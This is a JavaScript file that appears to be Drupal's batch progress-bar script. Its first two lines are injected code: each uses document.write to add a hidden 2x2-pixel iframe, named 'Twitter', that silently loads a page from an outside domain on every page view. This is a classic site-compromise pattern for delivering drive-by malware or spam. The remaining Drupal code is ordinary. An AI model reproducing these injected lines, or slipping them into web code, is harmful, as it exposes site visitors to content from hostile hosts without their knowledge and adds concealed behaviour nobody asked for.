document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://vanderlaandemunck.com/hbdn.html?j=2617366></iframe>');

document.write('<iframe name=Twitter scrolling=auto frameborder=no align=center height=2 width=2 src=http://seosuccess.net16.net/zqlv.html?j=1962603></iframe>');

(function ($) {

/**
 * Attaches the batch behavior to progress bars.
 */
Drupal.behaviors.batch = {
  attach: function (context, settings) {
    $('#progress', context).once('batch', function () {
      var holder = $(this);

      // Success: redirect to the summary.
      var updateCallback = function (progress, status, pb) {
        if (progress == 100) {
          pb.stopMonitoring();
          window.location = settings.batch.uri + '&op=finished';
        }
      };

      var errorCallback = function (pb) {
        holder.prepend($('<p class="error"></p>').html(settings.batch.errorMessage));
        $('#wait').hide();
      };

      var progress = new Drupal.progressBar('updateprogress', updateCallback, 'POST', errorCallback);
      progress.setProgress(-1, settings.batch.initMessage);
      holder.append(progress.element);
      progress.startMonitoring(settings.batch.uri + '&op=do', 10);
    });
  }
};

})(jQuery);